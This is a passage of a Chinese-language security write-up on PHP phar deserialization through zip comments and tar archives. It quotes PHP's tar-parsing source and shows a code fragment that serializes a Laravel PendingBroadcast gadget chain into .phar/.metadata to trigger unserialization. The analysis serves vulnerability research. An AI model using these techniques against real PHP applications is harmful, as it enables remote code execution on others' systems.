注意这里应该是申请了一块持久内存给mydata,zip注释内容写到了mydata中,因此我们将序列化数据写入zip注释后也通过可以触发phar反序列化,不过由于zip注释无法写入`%00`,如果有`protected`或者`private`需要将序列化数据s改成S,然后后面通过16进制写入进行绕过,不过该PHP版本为7.2,可以直接改为public即可

**tar的处理**<br>
前文说道,底层实现了对tarphar的处理，所有的处理都在`phar_parse_tarfile`中,这里也挑去重点进行分析:

[![](https://p1.ssl.qhimg.com/t014214d396f101b7a2.png)](https://p1.ssl.qhimg.com/t014214d396f101b7a2.png)

可以看到函数`phar_tar_process_metadata`进行了metadata的处理,因此我们查看其引用:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e81d8b5a5003142d.png)

跟进看下:

```
newentry = zend_hash_str_update_mem(&amp;myphar-&gt;manifest, entry.filename, entry.filename_len, (void*)&amp;entry, sizeof(phar_entry_info));

if (entry.filename_len &gt;= sizeof(".phar/.metadata")-1 &amp;&amp; !memcmp(entry.filename, ".phar/.metadata", sizeof(".phar/.metadata")-1)) `{`
    if (FAILURE == phar_tar_process_metadata(newentry, fp)) `{`
    if (error) `{`
        spprintf(error, 4096, "phar error: tar-based phar \"%s\" has invalid metadata in magic file \"%s\"", fname, entry.filename);
    `}`
    php_stream_close(fp);
    phar_destroy_phar_data(myphar);
   return FAILURE;
            `}`
        `}`
```

这里检查了tar压缩包中的文件名是否为`.phar/.metadata`,如果是则将`newentry`和`fp`分别作为`phar_tar_process_metadata`的两个参数,而`newentry-&gt;metadata`的值会进行反序列化处理

因此我们需要

```
...
...
$exp = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$broadcastevent);
file_put_contents(".phar/.metadata",serialize($exp));
```

然后将该文件夹压缩成tar包同样也能触发phar反序列化:

[![](https://p1.ssl.qhimg.com/t015995226641d93d73.png)](https://p1.ssl.qhimg.com/t015995226641d93d73.png)

参考文章:<br>[https://guokeya.github.io/post/uxwHLckwx/](https://guokeya.github.io/post/uxwHLckwx/)<br>[https://blog.zsxsoft.com/post/38](https://blog.zsxsoft.com/post/38)
